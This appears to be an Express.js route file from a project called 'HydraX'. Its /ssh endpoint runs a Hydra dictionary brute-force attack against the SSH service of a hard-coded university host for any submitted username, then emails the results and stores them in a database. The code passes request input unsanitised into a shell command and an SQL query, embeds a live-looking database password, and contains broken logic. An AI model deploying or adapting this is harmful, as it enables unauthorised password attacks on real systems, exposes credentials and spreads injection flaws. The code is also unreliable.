const express = require("express");
const targetIP = "pzi1.fesb.hr";
const targetPORT = "22";
const wordlistPath = "./lists/unix_passwords.txt";

const execute = require("child_process").execSync;
const postgres = require("postgres");
const fs = require("fs");
require("dotenv").config();
var nodemailer = require("nodemailer");
const { setTimeout } = require("timers");

let router = express.Router();
const transport = nodemailer.createTransport({
  service: "outlook",
  auth: {
    user: "",
    pass: "", //put in .ENV!!
  },
});

router.use(express.json());
router.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    next()
})

router
  .route("/ssh")
  .get((req, res) => {})
  .post((req, res) => {
    console.log("Client connected");
    const username = req.body.username;
    const email = req.body.email;
    var isFinished = true;
    execute(
      `hydra ${targetIP} ssh -l ${username} -P ${wordlistPath} -s ${targetPORT} -vV -o ./__data/hydra-result-${username}.json -b json`,
      (error, stdout, stderr) => {
        if (error) console.warn(error);
        console.log("Action finished");
        res.send(
          "Hydra dictionary brute-force attack " +
            " for username " +
            `${username} ` +
            " on " +
            `${targetIP}` +
            ". You will receive results on e-mail provided. Made by @petarcelar" +
            "\n https://pjeppsi/hydraX"
        );
      }
    );
    const URL = `postgres://petarcelar7:WZQHnrVC2kI7@ep-tight-night-820122.eu-central-1.aws.neon.tech/neondb?options=project%3Dep-tight-night-820122`;
    const sqlConnection = postgres(URL, { ssl: "require" });

    async function addResult(username) {
      await sqlConnection(
        `INSERT INTO account(username, passw) VALUES ('${username}'`
      );
    }
    let file = require(`../__data/hydra-result-${username}.json`);

    let result = file.results;
    var resultFinal = JSON.stringify(result);
    var mailContent = {
      from: "pcelar00@fesb.hr",
      to: `${email}`,
      subject: `HydraX scan report for ${username}`,
      text: `${resultFinal}`,
    };
    transport.sendMail(mailContent, function (error, info) {
      if (error) {
        console.log(error);
      } else {
        console.log("Email sent" + info.response);
      }
    });
    addResult(resultFinal)
  });

module.exports = router;
